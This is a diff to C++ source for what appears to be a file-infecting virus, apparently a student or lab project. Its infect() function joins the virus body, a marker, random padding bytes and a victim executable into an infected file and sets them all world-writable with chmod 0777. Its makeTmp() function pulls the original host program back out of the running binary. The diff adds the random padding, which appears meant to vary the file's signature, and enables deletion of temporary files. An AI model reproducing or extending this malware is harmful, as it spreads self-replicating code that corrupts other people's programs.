@@ -1,6 +1,7 @@
 #include <iostream>
 #include <fstream>
-
+#include <random>
+#include <ctime>
 #include <string>
 #include <cstring>
 #include <cstdlib>
@@ -50,12 +51,20 @@ bool infect(string& virusPath, string& infectedPath, string& victimPath){
             default:
                 break;
         }
+        //writing everything including marker to infected file
         fwrite(&byteC, 1, 1, infectedFile);
     }
 
     u_int64_t debug = 0;
+    
+    srand(time(0));
 
-    while(fread(&byteC, 1, 1, virusFile)==1){
+    for(int i = 0; i < 4; i++){
+        uint8_t rb = rand()%256;
+        fwrite(&rb, sizeof(rb), 1, infectedFile);
+    }
+
+    while(!(feof(victimFile))){
         debug = fread(&byteC, 1, 1, victimFile);
         if(debug != 1 && debug != 0){
             cout<<"bad fread\n";
@@ -69,13 +78,13 @@ bool infect(string& virusPath, string& infectedPath, string& victimPath){
             break;
         }
     }
-    chmod(victimPath.c_str(), 0777);
-    chmod(infectedPath.c_str(), 0777);
-    chmod(virusPath.c_str(), 0777);
+    
     fclose(victimFile);
     fclose(virusFile);
     fclose(infectedFile);
-
+    chmod(victimPath.c_str(), 0777);
+    chmod(infectedPath.c_str(), 0777);
+    chmod(virusPath.c_str(), 0777);
     return true;
 }
 
@@ -121,24 +130,29 @@ bool makeTmp (const string& f1, const string& f2){
                     break;
                 case 3:
                     cout<<marker<<"\n";
-                    if(bc == 0xef){marker++; found = true;fread(&bc, 1, 1, rfile); break;}
+                    if(bc == 0xef){marker++; found = true;
+                        while (1){
+                            debug = fread(&bc, 1, 1, rfile);
+                            //printf("reading byte: 0x%02x\n", bc);
+
+                            if (bc == 0x7F)
+                            {
+                                break;
+                            }
+                            if (debug == 0)
+                            {
+                                break;
+                            }
+                        }
+                    break;
+                    }
                     else{marker=0;}
                     break;
             }
         }
         if(found){
-            // while(1){
-            //     debug = fread(&bc, 1, 1, rfile);
-            //     //cout<<debug<<"\n";
-            //     if (debug != 1){
-            //         printf("bad read in makeTMP\n");
-            //         exit(0);
-            //     }
-            //     if(bc == 0x7F){
-            //         break;
-            //     }
-            // }
-            //printf("writing byte: 0x%02x\n", bc);
+            
+            //
             if (fwrite(&bc, 1, 1, hostx) != 1) {
                 cerr << "Error writing to " << f2 << "\n";
                 fclose(rfile);
@@ -164,6 +178,7 @@ bool makeTmp (const string& f1, const string& f2){
 
 int main (int argc, char *argv[]){
     string hostP = "./hostx";
+    system("rm ./hostx");
     if(!makeTmp(argv[0], hostP)){
         cerr<<"could not make file\n";
         exit(0);
@@ -181,7 +196,7 @@ int main (int argc, char *argv[]){
         chmod(argv[i], 0777);
         chmod(tmpFileName.c_str(), 0777);
         //execl(tmpFileName.c_str(), hostP.c_str());
-        //remove(tmpFileName.c_str());
+        remove(tmpFileName.c_str());
     }
     chmod(hostP.c_str(), 0777);
     
